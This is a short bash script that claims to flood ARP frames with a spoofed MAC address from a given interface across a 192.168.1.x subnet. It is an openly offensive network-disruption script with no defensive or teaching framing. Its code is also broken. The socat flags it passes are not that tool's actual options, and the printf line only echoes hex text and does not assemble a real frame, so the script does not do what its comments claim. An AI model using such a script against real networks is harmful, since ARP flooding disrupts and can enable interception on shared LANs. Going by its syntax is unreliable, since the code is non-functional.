#!/bin/bash

# Set the interface to flood ARP on
interface=$1

# Use a specific MAC address
specific_mac="00:11:22:33:44:55"

# Build the ARP frame
arp_frame=$(printf '%b' " 0806 0001 0800 06 04 00 01 $specific_mac 00000000 ffffffffffff 00000000 ")

# Flood ARP on the specified interface for the specified IP addresses
for ip in {1..254}; do
  echo "Flooding ARP on $interface for IP address $ip"
  sudo socat -d -t ARP -s "$interface" -p 0x0806 -a "$interface" -f "$arp_frame" --dst-ip 192.168.1.$ip
done
